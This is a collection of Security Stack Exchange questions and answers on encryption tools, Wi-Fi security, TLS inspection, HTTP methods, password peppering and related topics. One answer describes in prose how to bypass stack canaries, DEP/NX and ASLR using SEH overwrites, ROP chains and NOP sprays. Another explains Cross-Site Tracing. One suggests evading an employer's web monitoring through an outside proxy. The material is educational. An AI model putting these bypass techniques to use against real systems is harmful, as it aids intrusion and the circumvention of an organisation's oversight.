internet café. The operating system must be available without any
registration like Linux. The MAC-Adress of the Network-WiFi card in
the computer which is visible in the WI-Fi network must be changed
(this is easy possible in Linux)</li>
<li>If you want to do some research  about the TOR network you can try the Linux distribution <em>Tails</em> where everything is setup right (for example the flash player would use another channel which goes not through the TOR network.) Which means if you are using the flash player while browsing with TOR, the data packages for the flash-player will communicate with your real ip-adress and goes not through the TOR-nodes. <a href=""https://tails.boum.org/"">Tails Webiste</a></li>
</ol>
","29294"
"Is 7-Zip's AES encryption just as secure as TrueCrypt's version?","69856","","<p>The main difference being TrueCrypt creates containers and 7-Zip encrypts the file itself, so file sizes can be guessed. Now let's just talk about the strength and breakability of the encryption.</p>

<p>Update: <a href=""http://forums.truecrypt.org/viewtopic.php?p=107396"">http://forums.truecrypt.org/viewtopic.php?p=107396</a></p>
","<p>If implemented correctly, AES is AES; the output between two different implementations is identical, and therefore no distinction is possible in after-the-fact comparison -- if done correctly, the one is <strong>exactly the same</strong> as the other.</p>

<p>But there are a few points where differences can crop in:</p>

<p><strong>Operation Mode</strong><br>
Truecrypt implements a modified counter mode called XTS. It's pretty well vetted and has withstood some serious abuse from some powerful attackers (such as the US Government). </p>

<p>From examining the p7zip source code, it appears that AES encoding for the 7-zip format operates in CBC mode. This is certainly not necessarily insecure; it's the mode most popularly used in protocols such as TLS, but it is potentially vulnerable to padding oracle attacks. See <a href=""https://security.stackexchange.com/a/27780/2264"">this discussion on operation modes</a> for more information.</p>

<p><strong>Key Derivation</strong><br>
Truecrypt uses PBKDF2 to turn your password into an encryption key. It's difficult to come up with a better alternative than that. p7zip uses a salted SHA256 hash repeated over a configurable number of iterations. PBKDF2 is a bit more configurable, but 7-zip's alternative is functionally similar and arguably reaches the same goals.</p>

<p><strong>Vetted Implementation</strong><br>
Here's probably the biggest difference: TrueCrypt's code has been poured over by cryptographers and carefully examined for implementation mistakes. 7-zip's has not (at least not to the same degree). This means that there is a <em>higher probability</em> that 7-zip's code contains some sort of mistake that could allow for some sort of as-yet-unknown attack. That's not to say that such a mistake exists, and that's not to say that such a mistake couldn't be found in TrueCrypt instead. But the this is a matter of probability, not certainty. </p>

<p>All in all, the differences are minor, and for most use cases you shouldn't expect any difference at all from a security perspective. If it's a matter of life-and-death, I'd probably pick TrueCrypt. But for matters of mere secrecy, I'd recommend going with whichever solution fits your problem the best.</p>
","29400"
"What does working in cybersecurity look like?","69405","","<p>I am thinking of working in cybersecurity since a while now (I am doing a bachelor degree in computer science and I have one in mathematics). However, I don't know what it <strong>really</strong> looks like. And before considering what kind of future studies I should take, I would like to have the opinion of the people who are working in this area.</p>

<p>Is this an academic formation (university) or a more practical one (in collaboration with the police) ? Is there institutes where I can do a master degree or/and a Ph.D in this field ?</p>

<p>Despite it is very popular in the medias, I have never heard of a formation (maybe I don't ask the good questions or I don't know where to find the information...)</p>
","<p>The term cyber-security is large enough to represent many different sub-fields. As in many fields, there are theoretical approaches and more practical ones. </p>

<p>For instance, I now work at the <a href=""http://cccs.ncl.ac.uk"">Center for Cybercrime and Computer Security</a>, and within the same place, there are people working on cryptographic protocols (quite theoretical/maths), people working on collaboration with the police, e.g., to work with battered women, people working on usability aspect of security, people working on quantitative techniques (probability/uncertainty) of security mechanisms, and that's just on top of my head. </p>

<p>If you take a look at the <a href=""http://isg.rhul.ac.uk"">Information Security Group</a>, where I was working before, you'll find different profiles, and different aspects of cyber-security. In both of these examples, and in many others, you can both do a Master and a PhD. And, of course, I'm only talking here about places I know for working there, but there are plenty of them in the world. </p>

<p>It's quite frequent that security groups are started by people whose primary background is not in security, and that's why there are many approaches: algebra, formal methods, quantitative, psychological, distributed systems, operating systems, networks, etc. So, to answer your question precisely, <strong>yes, there are many places where to get a proper formation in cyber-security</strong>, and you will probably find one that suits you best. </p>

<p>EDIT: As another example of great place to look at, since your profile indicates you're in Switzerland, the ETH Zurich is considered as one of the top places in the world, and their <a href=""http://www.infsecmaster.ethz.ch"">Information Security Master</a> is probably very interesting (although with perhaps a more theoretical/academic aspect rather than concrete/applied). </p>
","31687"
"How do hackers take advantage of open ports as a vector for an attack?","68672","","<p>It is widespread knowledge, and therefore a common practice, to close open ports on any machines connected to the internet.</p>

<p>If for example, a typical program uses port xyz as it's communication channel, and there is a vulnerability in that program, which could be exploited through that port, why won't the same attack be successful through, let's say, port 80?</p>

<p>Given our pseudo program uses port 888 TCP, and it has a vulnerability which could be exploited, why can't that vulnerability be exploited through port 80 TCP (which is HTTP, and is open on almost any machine)?</p>

<p>Is port 80 on the web server listening only to a UNIQUE type of TCP packets? Does it accept only a certain kind of packet?</p>

<p>Why can't a hacker try to craft a TCP packet with a malicious string, encapsulate it inside the HTTP packet and therefore attack the web server?</p>
","<p>Services listen to ports. Web servers (a service) listen to port 80, but that's just a standard, not a hard rule. You could configure any service to listen on any port. It's not about 'special packets' it's about 'dialing the right port number' to get the service you want.</p>

<p>If your pseudo program has a vulnerability, then it can be attacked <strong>on the port it is assigned to</strong>. You can't attack a program on ports it is not listening to. If you try to attack it on another port (like port 80 in your example), your program will not be reached.</p>

<p>Your last question, then, is a little strange: ""Why can't a hacker try to craft a TCP packet with a malicious string, encapsulate it inside the HTTP packet and therefore attack the web server?"" That IS what hackers do. But they target the port of the service they want to hit. But maybe you can refine that question based on the information I have provided.</p>

<p>So, why close ports? Because you want to reduce the number of potentially vulnerable <em>services</em> that you expose to the Internet.</p>
","10732"
"How do I know if my computer is being used for a botnet-based DDoS attack?","68470","","<blockquote>
  <p>A <a href=""http://en.wikipedia.org/wiki/Botnet"">botnet</a> is a collection of compromised computers, each of which is
  known as a 'bot', connected to the Internet. When a computer is
  compromised by an attacker, there is often code within the malware
  that commands it to become part of a botnet. The ""botmaster"" or ""bot
  herder"" controls these compromised computers via standards-based
  network protocols such as IRC and http.</p>
</blockquote>

<p>Is there a way to detect that your computer is being used in a botnet-based DDoS attack?</p>

<p>There is some tool such as a software that could detect strange traffic and exploit activity from my computer?</p>
","<p>There's no easy way to detect whether your machine is part of a botnet.  Instead, the best defense is prevention: avoid getting infected in the first place.</p>

<p>There is lots and lots written on how to avoid security breaches, too much to repeat here.  For a starter, you could read, e.g., <a href=""https://security.stackexchange.com/q/11861/971"">a security guide for non-technical users</a>, <a href=""https://security.stackexchange.com/q/1992/971"">Windows hardening</a>, <a href=""https://security.stackexchange.com/q/993/971"">Hardening Linux Server</a>, or <a href=""https://security.stackexchange.com/q/4136/971"">Secure Linux Desktop</a>.  Happy reading!</p>
","12450"
"Why is WPA Enterprise more secure than WPA2?","67950","","<p>In personal mode WPA2 is more secure than WPA. However, I have read that WPA Enterprise provides stronger security than WPA2 and I am unsure exactly how this is achieved.</p>
","<p>The PSK variants of WPA and WPA2 uses a 256-bit key derived from a password for authentication.</p>

<p>The Enterprise variants of WPA and WPA2, also known as <code>802.1x</code> uses a RADIUS server for authentication purposes. Authentication is achieved using variants of the <a href=""http://en.wikipedia.org/wiki/Extensible_Authentication_Protocol"">EAP</a> protocol. This is a more complex but more secure setup.</p>

<p>The key difference between WPA and WPA2 is the encryption protocol used. WPA uses the <a href=""http://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol"">TKIP</a> protocol whilst WPA2 introduces suport for the <a href=""http://en.wikipedia.org/wiki/CCMP"">CCMP</a> protocol.</p>
","35782"
"Recommend Length for Wi-FI PSK?","67263","","<p>I currently have a network set up with WPA2 and AES encryption, the password is 8 characters long but was randomly generated and contains no dictionary words. However I'm concerned about the increasing power of computers and their ability to crack handshakes, as such I was considering increasing the length.</p>

<p>I'm aware that I can go up to 63 characters if I were extremely paranoid, but unfortunately I have to type this password into Android phones and other devices so I'd rather keep it reasonably short to allow for it to be easily typed.</p>

<p>Would a 16-character random password be enough to secure a WPA2 encrypted network? What is the current recommendation for password lengths, especially for wireless networks and what password length would be sufficient to protect my network against a standard attack?</p>
","<p>Yes, <strong>16 characters is more than sufficient</strong>, if they are randomly generated using a cryptographic-strength PRNG.  If you use lower-case, upper-case, and digits, and if you generate it truly randomly, then a 16-character password has 95 bits of entropy.  That is more than sufficient.  Actually, <strong>12 characters is sufficient</strong>; that gives you 71 bits of entropy, which is also more than sufficient for security against all of the attacks that attackers might try to attack your password.</p>

<p>Once your password is 12 characters or longer, the password is extremely unlikely to be the weakest link in your system.  Therefore, there's not much point choosing a longer password.  I see people who recommend using a 60-character password, but I don't think there's any rational basis for doing so.  My view is that usability is very important: if you make the security mechanism too hard to use, people will get annoyed and may be more reluctant to use it in the future, which isn't good.  A secure mechanism that isn't used isn't doing anyone any good.  That's why I prefer to choose a shorter password, like 12 characters or 16 characters in length, as it is perfectly adequate and more usable than a monstrous 60-character beast.</p>

<p>Be careful how you choose the password.  You need to use a cryptographically-strong PRNG, like <code>/dev/urandom</code>.  For instance, here is a simple script I use on Linux:</p>

<pre><code>#!/bin/sh
# Make a 72-bit password (12 characters, 6 bits per char)
dd if=/dev/urandom count=1 2&gt;/dev/null | base64 | head -1 | cut -c4-15
</code></pre>

<p>Don't try to choose passwords yourself.  Human-chosen passwords are typically easier to guess than a truly random password.</p>

<p>One very important caveat: There are other issues as well, beyond password length.  It is very important that you <strong>turn off WPS</strong>, as <a href=""http://dankaminsky.com/2012/01/26/wps2/"">WPS has major security holes</a>.  Also, I recommend that you use WPA2; avoid WPA-TKIP, and never use WEP.</p>
","15686"
"How can I identify my phone call is being tracked or tapped?","66514","","<p>When I read about mobile call tracing, the hackers/security experts track and record mobile phone calls somehow.</p>

<p>Is it possible for us to identify that <strong>our call is tracked by someone</strong> or heard by someone?</p>
","<p>You could try another old-fashioned way and disclose something specific on the phone, and nowhere else, that would be of interest to those monitoring you. </p>

<p>If that information is later used you will know your phones are being monitored.</p>
","20902"
"Can a CSR be created in OpenSSL with SHA2?","66340","","<p>Can a CSR be created in OpenSSL with SHA2? If so, what would the command be and what does this tell the CA, if anything? If you could create a CSR using SHA2 would it ""tell"" the signing CA to use it on the entire cert chain?</p>
","<p>You can add, for example the <code>-sha256</code> flag to the OpenSSL command line when generating the CSR.  I don't believe any CA will change how they sign your CSR based on this, and it certainly won't affect the certificate chain.  They're not resigning the cert chain for each key, the only signature operation they do is on your CSR itself.  Any intermediate/root CAs provided will be exactly the same for all customers.</p>
","65274"
"Stack Overflows - Defeating Canaries, ASLR, DEP, NX","65676","","<p>To prevent buffer overflows, there are several protections available such as using Canary values, ASLR, DEP, NX. But, where there is a will, there is a way. I am researching on the various methods an attacker could possibly bypass these protection schemes. It looks like there is no one place where clear information is provided.
These are some of my thoughts.</p>

<p><strong>Canary</strong> - An attacker could figure out the canary value and use that in his buffer injection to fool the stack guard from detecting an exploit</p>

<p><strong>DEP, NX</strong> - If there are calls to <code>VirtualAlloc(), VirtualProtect()</code>, the attacker could try to redirect code to these functions and disable DEP, NX on the pages that he wants to inject arbitrary code on.</p>

<p><strong>ASLR</strong> - No clue . <a href=""https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work"">How do ASLR and DEP work?</a></p>
","<p><strong>Canary</strong><br />
Stack canaries work by modifying every function's prologue and epilogue regions to place and check a value on the stack respectively. As such, if a stack buffer is overwritten during a memory copy operation, the error is noticed <em>before</em> execution returns from the copy function. When this happens, an exception is raised, which is passed back up the exception handler hierarchy until it finally hits the OS's default exception handler. If you can overwrite an existing exception handler structure in the stack, you can make it point to your own code. This is a Structured Exception Handling (SEH) exploit, and it allows you to completely skip the canary check.</p>

<p><strong>DEP / NX</strong><br />
DEP and NX essentially mark important structures in memory as non-executable, and force hardware-level exceptions if you try to execute those memory regions. This makes normal stack buffer overflows where you set <code>eip</code> to <code>esp+offset</code> and immediately run your shellcode impossible, because the stack is non-executable. Bypassing DEP and NX requires a cool trick called <a href=""http://en.wikipedia.org/wiki/Return-oriented_programming"">Return-Oriented Programming</a>.</p>

<p>ROP essentially involves finding existing snippets of code from the program (called gadgets) and jumping to them, such that you produce a desired outcome. Since the code is part of legitimate executable memory, DEP and NX don't matter. These gadgets are chained together via the stack, which contains your exploit payload. Each entry in the stack corresponds to the address of the next ROP gadget. Each gadget is in the form of <code>instr1; instr2; instr3; ... instrN; ret</code>, so that the <code>ret</code> will jump to the next address on the stack after executing the instructions, thus chaining the gadgets together. Often additional values have to be placed on the stack in order to successfully complete a chain, due to instructions that would otherwise get in the way.</p>

<p>The trick is to chain these ROPs together in order to call a memory protection function such as <code>VirtualProtect</code>, which is then used to make the stack executable, so your shellcode can run, via an <code>jmp esp</code> or equivalent gadget. Tools like <a href=""https://github.com/corelan/mona""><code>mona.py</code></a> can be used to generate these ROP gadget chains, or find ROP gadgets in general.</p>

<p><strong>ASLR</strong><br />
There are a few ways to bypass ASLR:</p>

<ul>
<li>Direct RET overwrite - Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a <code>jmp esp</code>.</li>
<li>Partial EIP overwrite - Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. We still need a non-ASLR module for this though.</li>
<li>NOP spray - Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. Won't work if DEP is switched on though.</li>
<li>Bruteforce - If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.</li>
</ul>

<hr>

<p>Recommended reading:</p>

<ul>
<li><a href=""https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/"">Corelan - Chaining DEP with ROP</a></li>
<li><a href=""https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/"">Corelan - Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
<li><a href=""http://www.exploit-db.com/wp-content/themes/exploit/docs/17914.pdf"">ASLR/DEP bypass whitepaper</a> (PDF)</li>
</ul>
","20502"
"Can my company see what HTTPS sites I went to?","65603","","<p>At work my company uses internet monitoring software (websense). I know if I visit a https ssl-encrypted site (such as <a href=""https://secure.logmein.com"">https://secure.logmein.com</a>) they can't see what I'm doing on the site since all the traffic is encrypted. But do they see, that I visited <a href=""https://secure.logmein.com"">https://secure.logmein.com</a> ?</p>
","<p>An encrypted connection is established first before any HTTP requests are performed (e.g. GET, POST, HEAD, etc.), but the hostname and port are visible.       </p>

<p>There are many other ways to detect which sites you’re visiting as well, for example:   </p>

<ul>
<li>your DNS queries (i.e. they’ll see the IP request for secure.logmein.com)  </li>
<li>via network monitoring (e.g. netflow, IP to IP sessions, sniffing, etc.)  </li>
<li>if the device you are working on is owned by the company and they have administrator access/privileges to view anything on the device (e.g. view your browser caches)  </li>
</ul>

<p>A popular way to evade a websense proxy is to first establish a connection (via HTTPS:) to an outside proxy (e.g. <a href=""https://proxy.org/"">https://proxy.org/</a>) and make your request from there.  </p>
","2916"
"Sniffing, Snooping, Spoofing","65123","","<p>Could somebody please explain me the differences between the following attacks?</p>

<ul>
<li>sniffing </li>
<li>snooping </li>
<li>spoofing</li>
</ul>

<p>My professors used them all in his documents, but I'm not sure, if those are 3 different attacks or just synonyms.</p>

<p>Thank you in advance.</p>
","<p>Sniffing and snooping should be synonyms. They refer to listening to a conversation. For example, if you login to a website that uses no encryption, your username and password can be sniffed off the network by someone who can capture the network traffic between you and the web site.</p>

<p>Spoofing refers to actively introducing network traffic pretending to be someone else. For example, spoofing is sending a command to computer A pretending to be computer B. It is typically used in a scenario where you generate network packets that say they originated by computer B while they really originated by computer C. Spoofing in an email context means sending an email pretending to be someone else.</p>
","52987"
"Someone keeps using my email address. What to do?","64732","","<p>I have had a GMail ever since it was created, so it's an email address that is easy to remember, but also easy for somebody else to get confused with. </p>

<p>Since I'm not going to post my email address here, I'll put the format for it which is <code>[first name][2 digit number]@gmail.com</code>. Because of this, somebody unknowingly (or knowingly) has been using my email address to sign up for all sorts of things and now my inbox is even more full of junk. </p>

<p>I was able to get his information (name, address, etc) from all the places that he's signed up for using my email, but I have been unable to find him to get a hold of him about this matter. I have also had to get a hold of all sorts of places that he's used my email to tell them that he has it wrong and all they will do is remove my email and won't try to tell him he's got the wrong email address. </p>

<p>It is starting to become very time consuming and annoying that I have to get all these emails and have to get it removed. If I just ignore/delete these emails, then there's just going to be more and more of them. </p>

<p>I'm wondering if anyone has had this happen before and if there's any solution for this sort of thing?</p>
","<p>This is not very uncommon. Unfortunately you have no single solution, unless the individual is in the same locale as you (in which case you may be able to take legal action if he is causing you to incur costs)</p>

<p>Generally, there is no technical solution, as this is a human problem. They could be doing it deliberately, as Pacerier suggests, or they may just think that they have the email address right.</p>

<p>Online services typically just let people signup with whatever address they give. The better ones require email validation - so as long as you don't validate the email, those ones shouldn't cause you any problems.</p>

<p>In summary - you can try and educate the guy, but basically you'll just need to ignore the issue.</p>
","51289"
"What are the dangers of allowing ""less secure apps"" to access my Google account?","64659","","<p>According to <a href=""https://support.google.com/accounts/answer/6010255"">https://support.google.com/accounts/answer/6010255</a>:</p>

<blockquote>
  <p>Google may block sign in attempts from some apps or devices that do not use modern security standards. Since these apps and devices are easier to break into, blocking them helps keep your account safer. </p>
</blockquote>

<p>What are those ""modern security standards"" and why is it dangerous to allow apps which do not support them? Also, is it dangerous to enable the option (allow less secure apps) if you do not use those apps? If so, why?</p>

<p>I believe it might be OAuth2.0 over IMAP (according to <a href=""http://googleonlinesecurity.blogspot.co.uk/2014/04/new-security-measures-will-affect-older.html"">this</a> page). As far as I know, this is Google's own extension and is not used by any other service providers.</p>

<p>In my specific case I was trying to access my Gmail account using Kmail (v4.14.0) and IMAP.</p>
","<p>In my understanding, ""less secure apps"" refers to applications that send your credentials directly to Gmail. Lots of things can go wrong when you give your credentials to third party to give to the authentication authority: the third party might keep the credentials in storage without telling you, they might use your credentials for purposes outside the stated scope of the application, they might send your credentials over a network without encryption, etc.</p>

<p>Additionally, it could be an app that a user has installed locally such as an IMAP client (see the following support note from google: <a href=""https://support.google.com/accounts/answer/6010255?hl=en"" rel=""noreferrer"">https://support.google.com/accounts/answer/6010255?hl=en</a>)</p>

<p>""Less secure"" isn't meant to say that apps that use your credentials are necessarily full of security holes or run by criminals. Rather, it is the <em>category of behavior</em> -- giving your credentials to a third party -- that is <em>fundamentally less secure</em> than using an authorization mechanism like OAuth. With authorization, you never allow the third party to see your credentials, so an entire category of problems are instantly eliminated.</p>

<p>In OAuth, you authenticate directly to Gmail with your credentials and authorize an app to do certain things. The third-party app only sees an authorization token provided by Google as proof that you authenticated correctly and agreed to authorize that app.</p>

<p>As for why it would be dangerous to <em>enable</em> less secure apps (versus <em>using</em> a particular app that may be untrustworthy), I'm not totally sure. Google's refusal to authenticate happens after you've already given away your credentials to the application. It seems to me that any time you provide your credentials to a third party, it doesn't matter whether or not you've allowed authentication by ""less secure apps"" -- someone can just load up a log-in screen and directly log in as you. The only possible cases I can think of are:</p>

<ul>
<li><p>Possibly ""app-based"" login attempts are treated differently from ""human-based"" login attempts, in particular how they treat sudden changes in location. Maybe the ""less secure"" app you're trying to use has servers on another continent, so it's not suspicious to Gmail when an app tries to log in as you somewhere else, while an attempt to use the log in screen from another continent by a human would be suspicious.</p></li>
<li><p>Possibly ""less secure"" auth methods include some other login method that doesn't directly reveal your credentials to the third-party but are less secure than OAuth 2.0 in some other way (e.g., they're vulnerable to eavesdropping by an attacker, or they make it somehow easier for an attacker to access your account without knowing your password).</p></li>
</ul>

<p>Those two points are <strong>pure conjecture</strong> and <strong>very well may not be true</strong> in actual fact.</p>
","72371"
"How do we determine the SSL/TLS version of an HTTP request?","64494","","<p>We are wanting to configure our Windows client to use only TLS 1.1 and greater. <a href=""https://support.microsoft.com/en-us/kb/245030"" rel=""noreferrer"">We've learned that we can do this by editing the registry.</a> Now we want to make several HTTPS requests from different applications and check to be sure that they all use TLS 1.1 and above.</p>

<p>What we have tried is to run Wireshark with <code>(ip.dst == 137.117.17.70) &amp;&amp; ssl</code> and with <code>(ip.src == 137.117.17.70) &amp;&amp; ssl</code> as the filter and then run a web request from Internet Explorer. The results show this for the Client Hello.</p>

<pre><code>Secure Sockets Layer
  TLSv1.2 Record Layer: Handshake Protocol: Client Hello
    Version: TLS 1.0   
    Handshake Protocol: Client Hello
      Version: TLS 1.2
</code></pre>

<p>And they show this for the Server Hello. </p>

<pre><code>Secure Sockets Layer
  TLSv1.2 Record Layer: Handshake Protocol: Server Hello
    Version: TLS 1.2
    Handshake Protocol: Server Hello
      Version: TLS 1.2
</code></pre>

<p><a href=""https://i.stack.imgur.com/LgBHo.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/LgBHo.png"" alt=""Secure Sockets Layer""></a></p>

<p>My sense is that that means we have not successfully turned off the legacy protocol, because the Client Hello initially says 1.0. Is that right?</p>

<p>Here is a better way of filtering for the Client Hello and Server Hello for a specific IP address. </p>

<pre><code>(ip.src == 137.117.17.70) &amp;&amp; ssl.handshake.type == 1
(ip.dst == 137.117.17.70) &amp;&amp; ssl.handshake.type == 2
</code></pre>
","<p>You want to look at the ""protocol version"" in the <code>ServerHello</code> message. Consider this image, shamelessly plundered from <a href=""http://www.cloudshield.com/blog/advanced-malware/how-to-decrypt-openssl-sessions-using-wireshark-and-ssl-session-identifiers/"" rel=""noreferrer"">the Web</a> and that shows a screenshot of a <code>ServerHello</code> being decoded by Wireshark:</p>

<p><a href=""https://i.stack.imgur.com/k1gjb.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/k1gjb.jpg"" alt=""SSL ServerHello in Wireshark""></a></p>

<p>There are two ""Version: TLS 1.0 (0x0301)"" instances in this picture. The first one is from the header of the record that contains the <code>ServerHello</code>. The second one is from the contents of the <code>ServerHello</code> message itself. The second one is the one you are interested in, because it is the way the server informs the client about the protocol version that will be used for this connection.</p>
","100032"
"How to exploit HTTP Methods","64003","","<p>Many security scanners like <a href=""http://cirt.net/nikto2"">nikto</a>, <a href=""http://www.tenable.com/"">nessus</a>, <a href=""http://nmap.org/"">nmap</a>, and <a href=""http://w3af.sourceforge.net/"">w3af</a> sometimes show that certain HTTP Methods like HEAD, GET, POST, PUT, DELETE, TRACE, OPTIONS, CONNECT, etc are vulnerable to attack. </p>

<p>What do these headers do and how can they be exploited?</p>

<p>I'm looking something more creative than common exploits like POST or GET injections (e.g., changed fields). It would help me to understand if your answer showed me a brief example of the normal usage of the header as compared to an exploit technique of a header.</p>
","<p>Some of these methods are typically dangerous to expose, and some are just extraneous in a production environment, which could be considered extra attack surface. Still, worth shutting those off too, since you probably wont need them:  </p>

<ul>
<li>HEAD, GET, POST, CONNECT - these are completely safe, at least as far as the HTTP Method itself. Of course, the request itself may have malicious parameters, but that is seperate from the Method... these are typically (note exception below) the only ones that should be enabled.</li>
<li><p>PUT, DELETE - as mentioned by @Justin, these methods were originally intended as file management operations.<br>
Some web servers still support these in their original format. That is, you can change or delete files from the server's file system, arbitrarily. Obviously, if these are enabled, it opens you to some dangerous attacks.<br>
File access permissions should be <em>very</em> strictly limited, if you absolutely MUST have these methods enabled. But you shouldn't, anyway - nowadays, there are simple scripts you can use (if this is a static website - if it's an actual application, just code it yourself) to support this feature if you need it.<br>
NOTE: One valid scenario to enable these methods (PUT and DELETE) is if you are developing a strictly <a href=""http://en.wikipedia.org/wiki/RESTful"">RESTful</a> API or service; however, in this case the method would be handled by your application code, and not the web server. </p></li>
<li><p>OPTIONS - this is a diagnostic method, which returns a message useful mainly for debugging and the like. This message basically reports, surprisingly, which HTTP Methods are active on the webserver. In reality, this is rarely used nowadays for legitimate purposes, but it does grant a potential attacker a <em>little</em> bit of help: it can be considered a shortcut to find another hole.<br>
Now, this by itself is not really a vulnerability; but since there is no real use for it, it just affects your attack surface, and ideally should be disabled.<br>
NOTE: Despite the above, OPTIONS method IS used for several legitimate purposes nowadays, for example some REST APIs require an OPTIONS request, CORS requires pre-flight requests, and so on. So there definitely are scenarios wherein OPTIONS should be enabled, but the default should still be ""disabled unless required"". </p></li>
<li><p>TRACE - this is the surprising one... Again, a diagnostic method (as @Jeff mentioned), that returns in the response body, the entire HTTP Request. This includes the request body, but also the request headers, including e.g. cookies, authorization headers, and more.<br>
Not too surprising, this can be substantially misused, such as the classic <a href=""https://www.owasp.org/index.php/Cross_Site_Tracing"">Cross-Site Tracing (XST)</a> attack, wherein an XSS vector can be utilized to retrieve HttpOnly cookies, authorization headers, and such. This should <em>definitely</em> be disabled. </p></li>
<li><p>One other set of Methods bears mentioning: <strong>ALL OTHERS</strong>. For some webservers, in order to enable/disable/restrict certain HTTP Methods, you explicitly set them one way or another in the configuration file. However, if no default is set, it can be possible to ""inject"" additional methods, bypassing certain access controls that the web server may have implemented (poorly). See for example <a href=""https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29#Arbitrary_HTTP_Methods"">some more info on OWASP</a>.</p></li>
</ul>
","21424"
"Password Hashing: add salt + pepper or is salt enough?","63897","","<p><strong>Please Note:</strong> I'm aware that the proper method for secure password storage hashing is either scrypt or bcrypt. This question isn't for implementation in actual software, it's for my own understanding.</p>

<p><strong>Related</strong>  </p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/211/password-hashing"">How to securely hash passwords?</a></li>
<li><a href=""https://security.stackexchange.com/q/3165/2113"">HMAC - Why not HMAC for password storage?</a></li>
<li><a href=""https://security.stackexchange.com/a/21264/2113"">How to apply a pepper correctly to bcrypt?</a></li>
</ul>

<hr/>

<p><strong>Background</strong><br>
As far as I know, the recommended/approved method for storing password verifiers is to store:</p>

<pre><code>$verifier = $salt + hash( $salt + $password )
</code></pre>

<p>Where:</p>

<ul>
<li><code>hash()</code> is a cryptographic hashing algorithm  </li>
<li><code>$salt</code> is a random, evenly distributed, high entropy value  </li>
<li><code>$password</code> is the password entered by the user  </li>
</ul>

<p>Some people advice to add a secret key into the mix (sometimes called <strong>pepper</strong>). Where the pepper is a secret, high entropy, system-specific constant.</p>

<p>The rationale seems to be that the it even if the attacker gets hold of the password verifiers, there is a good chance he or she does not know the pepper value. So mounting a successful attack becomes harder.</p>

<p><strong>So, my question is:</strong><br>
Does adding a pepper value in addition to a salt when hashing passwords increase the overall security?  </p>

<p>Or is the perceived increased security based on false assumptions?</p>

<p><strong>Quick Update</strong><br>
I know the purpose of the <code>$salt</code> (I wrote quite a <a href=""https://stackoverflow.com/questions/1645161/salt-generation-and-open-source-software/1645190#1645190"">long answer</a> on StackOverflow about it) the additional <code>$pepper</code> key is <em>not</em> improving upon what the salt does.<br>
The question is, does the <code>$pepper</code> add any security <em>other</em> than what the salt does?</p>
","<p><strong>In some circumstances, peppers can be helpful.</strong></p>

<p>As a typical example, let's say <strong>you're building a web application.</strong> It consists of webapp code (running in some webapp framework, ASP.NET MVC, Pyramid on Python, doesn't matter) and a SQL Database for storage. The webapp and SQL DB <em>run on different physical servers</em>.</p>

<p><strong>The most common attack against the database</strong> is a successful SQL Injection Attack. This kind of attack does not necessarily gain access to your webapp code, because the webapp runs on a different server &amp; user-ID.</p>

<p><strong>You need to store passwords securely</strong> in the database, and come up with something on the form of:</p>

<pre><code>$hashed_password = hash( $salt . $password )
</code></pre>

<p>where <code>$salt</code> is stored in plaintext in the database, together with the <code>$hashed_password</code> representation and <em>randomly chosen for each new or changed password</em>.</p>

<p>The <strong>most important aspect of every password hashing scheme</strong> is that <code>hash</code> is a <strong>slow</strong> cryptographically secure hash function, see <a href=""https://security.stackexchange.com/a/31846/10727"">https://security.stackexchange.com/a/31846/10727</a> for more background knowledge.</p>

<p>The question is then, <strong>given that it is almost zero effort to add a constant value</strong> to the application code, and that the application code will typically <em>not</em> be compromised during an SQL Injection Attack, is the following then substantially better than the above?</p>

<pre><code>$hashed_password = hash( $pepper . $salt . $password )
</code></pre>

<p>where <code>$salt</code> is stored in plaintext in the database, and <code>$pepper</code> is a constant stored in plaintext in the application code (or configuration if the code is used on multiple servers or the source is public).</p>

<p>Adding this <code>$pepper</code> is easy -- you're just creating a constant in your code, entering a large cryptographically secure random value (for example 32byte from /dev/urandom hex or base64 encoded) into it, and using that constant in the password hashing function.  If you have existing users you need a migration strategy, for example rehash the password on the next login and store a version number of the password hashing strategy alongside the hash.  </p>

<h2>Answer:</h2>

<p>Using the <code>$pepper</code> <strong>does</strong> add to the strength of the password hash <strong>if</strong> compromise of the database <strong>does not imply</strong> compromise of the application. Without knowledge of the pepper the passwords remain completely secure. Because of the password specific salt you even can't find out if two passwords in the database are the same or not. </p>

<p>The reason is that <code>hash($pepper . $salt . $password)</code> effectively build a pseudo random function with <code>$pepper</code> as key and <code>$salt.$password</code> as input (for sane <code>hash</code> candidates like PBDKF2 with SHA*, bcrypt or scrypt). Two of the guarantees of a pseudo random function are that you cannot deduce the input from the output under a secret key and neither the output from the input without the knowledge of the key. This sounds a lot like the one-way property of hash functions, but the difference lies in the fact that with low entropy values like passwords you can effectively enumerate all possible values and compute the images under the public hash function and thus find the value whose image matches the pre-image. With a pseudo random function you cannot do so without the key (i.e. without the pepper) as you can't even compute the image of a single value without the key.</p>

